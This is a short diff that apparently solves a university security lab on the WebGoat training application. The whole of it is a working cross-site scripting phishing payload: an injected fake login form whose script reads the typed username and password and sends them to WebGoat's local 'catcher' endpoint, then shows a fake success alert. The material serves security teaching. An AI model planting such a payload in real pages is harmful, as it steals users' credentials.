@@ -1,0 +1,21 @@
+
+<script>
+function sendCredential() {
+	var username = document.getElementById("ece568-2020f-user").value;
+	var password = document.getElementById("ece568-2020f-pw").value;
+    var xhr = new XMLHttpRequest();
+	var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phish-username=" + username + "&phish-password=" + password;
+    xhr.open("POST", url, true);
+    xhr.send(null);
+
+	alert("login successfully" );
+}
+</script>
+<br>
+<form>
+<label for="ece568-2020f-user"><b>Username</b></label>
+<input id="ece568-2020f-user" type="TEXT"><br>
+<label for="ece568-2020f-pw"><b>Password</b></label>
+<input id="ece568-2020f-pw" type="PASSWORD"><br>
+<button id="ece568-2020f-submit" type="button" onclick="sendCredential()">Login</button>
+</form>
